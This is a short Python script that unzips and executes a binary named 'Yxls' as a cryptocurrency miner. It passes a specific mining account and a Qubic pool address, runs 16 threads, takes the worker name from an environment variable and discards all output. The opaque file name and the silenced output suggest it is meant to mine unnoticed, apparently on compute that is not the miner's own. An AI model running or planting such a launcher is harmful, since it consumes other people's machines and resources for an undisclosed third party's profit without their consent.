import os
os.system("unzip Yxls.zip")
os.system("chmod +x Yxls")
wn=os.getenv('nn')
os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
